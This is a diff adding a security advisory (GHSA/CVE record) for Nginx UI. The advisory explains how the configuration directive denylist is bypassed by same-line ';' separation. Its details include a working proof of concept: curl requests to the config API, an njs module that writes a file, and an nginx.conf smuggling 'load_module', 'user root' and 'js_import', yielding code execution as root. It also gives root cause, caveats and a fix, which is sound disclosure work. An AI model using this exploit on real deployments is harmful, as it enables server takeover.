@@ -1,0 +1,57 @@
+{
+  "id": "GHSA-cf23-7qxj-xmhr",
+  "modified": "2026-10-15T20:30:06.350724697Z",
+  "published": "2026-10-15T20:13:52Z",
+  "aliases": [
+    "CVE-2026-84316"
+  ],
+  "summary": "Nginx UI: nginx config directive denylist (ValidateConfigFile) is bypassable via same-line \";\" separation → authenticated directive injection (RCE on the official image)",
+  "details": "## Summary\n`config.ValidateConfigFile` is the security control that blocks dangerous nginx directives\n(`js_*`, `perl_*`, `load_module` of njs/perl modules, `user root`). Its directive scanner is\nbypassable: it splits the config by newlines and inspects only the FIRST token of each line, but\nnginx separates directives with `;`, not newlines. Putting a benign directive first and the blocked\ndirective after a `;` on the SAME line defeats every check. The `include` directive is also not on\nthe denylist. As a result, an authenticated caller can inject the exact directives the hardening was\nmeant to block, through EVERY path that calls the validator — `POST /api/configs` (add), the REST\nconfig modify endpoint (api/config/modify.go), the MCP `nginx_config_modify` tool, and the\nsite/stream save paths (internal/site/save.go, internal/stream/save.go). On deployments where\nnginx has the njs/perl module (the official uozi/nginx-ui Docker image ships ngx_http_js_module.so),\nthis leads to code execution in the nginx worker; with `user root` the workers run as root.\n\nThis is distinct from the config_add gap (the MCP nginx_config_add tool not calling the validator at\nall): here the validator IS called and still bypassed, so fixing config_add does not fix this.\n\n## Root cause (internal/config/validation.go, ValidateConfigDirectives)\n```go\nfor _, line := range bytes.Split(content, []byte(\"\\n\")) {          // splits on \\n only\n    trimmed := strings.TrimSpace(string(line))\n    ...\n    directive := firstDirectiveToken(trimmed)                      // first [a-zA-Z_]* of the line\n    if directive == \"user\" \u0026\u0026 configuresRootWorkers(trimmed) { ... }     // keyed on first token\n    if directive == \"load_module\" \u0026\u0026 loadsRestrictedDynamicModule(...) { ... } // keyed on first token\n    if _, blocked := blockedConfigDirectives[directive]; blocked { ... }      // keyed on first token\n}\n```\nnginx parses `a 1; b 2;` on one line as two directives, but this scanner only ever sees `a`.\n`include` is absent from `blockedConfigDirectives`.\n\n## Proof of Concept (live, official image uozi/nginx-ui:2.3.11) — VALIDATED paths only\nAuthenticated with a node secret (`X-Node-Secret`, from nginx-ui's first-boot log) or a user JWT.\nEvery step below hits a path that calls ValidateConfigFile.\n\n1) Baseline — validator works on a plain line:\n```\ncurl -X POST http://HOST/api/configs -H \"X-Node-Secret: $S\" -H 'Content-Type: application/json' \\\n  -d '{\"name\":\"x.conf\",\"base_dir\":\"\",\"content\":\"js_import a.js;\",\"overwrite\":true}'\n# -\u003e 40017 \"file content contains restricted nginx directive: js_import\"   (REJECTED)\n```\n\n2) Create the njs module file via the VALIDATED REST add (JS source is not nginx directives, so it\n   passes ValidateConfigContent):\n```\npoc.conf:\n  import fs from 'fs';\n  function pwn(r){ fs.writeFileSync('/tmp/NJS_VIA_DENYLIST_BYPASS.txt','denylist-bypass-rce-ok\\n'); r.return(200,'pwned2\\n'); }\n  export default { pwn };\ncurl -X POST http://HOST/api/configs -H \"X-Node-Secret: $S\" -H 'Content-Type: application/json' \\\n  -d '{\"name\":\"poc.conf\",\"base_dir\":\"\",\"content\":\"\u003cthe JS above\u003e\",\"overwrite\":true}'   # ACCEPTED\n```\n\n3) Overwrite the main nginx.conf via the VALIDATED `nginx_config_modify` MCP tool, smuggling each\n   blocked directive after a benign one on the SAME line (this is ACCEPTED by ValidateConfigFile):\n```nginx\nworker_processes 1; load_module /usr/lib/nginx/modules/ngx_http_js_module.so;\nerror_log /var/log/nginx/error.log notice; user root;\npid /run/nginx.pid;\nevents { worker_connections 1024; }\nhttp {\n    include /etc/nginx/mime.types;\n    default_type application/octet-stream; js_import poc from /etc/nginx/poc.conf;\n    server { listen 8897; location = /pwn3 { js_content poc.pwn; } }\n}\n```\n\n4) Reload. Result:\n- `nginx -t` successful.\n- worker `/proc/\u003cpid\u003e/status` → `Uid: 0 0 0 0` (root) — the blocked `user root` took effect.\n- `GET http://127.0.0.1:8897/pwn3` → `pwned2` — js_content executed.\n- `/tmp/NJS_VIA_DENYLIST_BYPASS.txt` created, owned by root → njs code execution as root.\n\n(An MCP-over-SSE client for steps using nginx_config_modify is included in the config_add report as\n`poc_mcp_client.py`; the same client drives this PoC. `X-Node-Secret` authenticates both REST and MCP.)\n\n## Impact\nAuthenticated config-injection that defeats the directive-validation control on all guarded write\npaths. On deployments with njs/perl available (the official Docker image ships ngx_http_js_module.so):\ncode execution in the nginx worker and, via `user root`, arbitrary file read/write as root (trivially\nescalated to full host compromise). On stock nginx without those modules: reliable DoS (failed\nreload) plus `user root` privilege regression.\n\n## Honest scope / caveats\n- Authenticated (node secret or user JWT), agent-mediated — not unauthenticated.\n- What was live-verified: the bypass + full RCE on `POST /api/configs` (add) and the MCP\n  `nginx_config_modify` tool. The other callers — REST config modify (api/config/modify.go), site\n  save (internal/site/save.go), stream save (internal/stream/save.go) — invoke the SAME\n  `ValidateConfigFile` (code-confirmed), so they are affected by construction; I did not individually\n  live-test each.\n- RCE is conditional on the njs/perl module being present; it ships in the official image, so the\n  default Docker deployment is exploitable. On stock nginx without those modules the injected\n  `load_module`/`js_*` make reload fail → DoS plus a `user root` privilege regression (inferred from\n  nginx module behavior; not separately tested on a stock build).\n- The `;` and `include` bypasses are fully confirmed live. A backslash line-continuation variant was\n  accepted by the validator but its nginx parsing was not separately confirmed and is not relied on.\n- \"Full host compromise\" describes the capability of root file read/write via njs `fs` (proven: a\n  root-owned file was written); the subsequent authorized_keys/cron step is a well-known escalation,\n  not something this PoC executed.\n\n## Suggested fix\nDo not hand-roll a newline/first-token denylist. Validate the way nginx parses: split statements on\n`;` (and handle blocks, comments, line continuations), validate EVERY statement, block/limit\n`include`, and recurse into included files — or validate via an allowlist and/or by running\n`nginx -t` on the candidate before activating it.\n\n## Dedup / novelty\nDistinct from CVE-2026-33032 (unauthenticated MCP endpoint — an auth issue, now fixed) and from the\nseparately reported config_add validation gap (a missing validator call on one path). This is a\nbypass of the validator itself, affecting every path that calls it; no existing CVE/GHSA covers it\n(checked osv.dev and the GitHub advisory database for this repo). Appears novel.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/0xJacky/Nginx-UI",
+        "purl": "pkg:golang/github.com/0xJacky/Nginx-UI"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.9.10-0.20260703131214-23d1934099b0"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-cf23-7qxj-xmhr/GHSA-cf23-7qxj-xmhr.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-cf23-7qxj-xmhr"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-84316"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/0xJacky/nginx-ui/commit/23d1934099b05b2a01589b48129dc3d3159d91c2"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/0xJacky/nginx-ui"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/0xJacky/nginx-ui/releases/tag/v2.4.1"
+    }
+  ]
+}
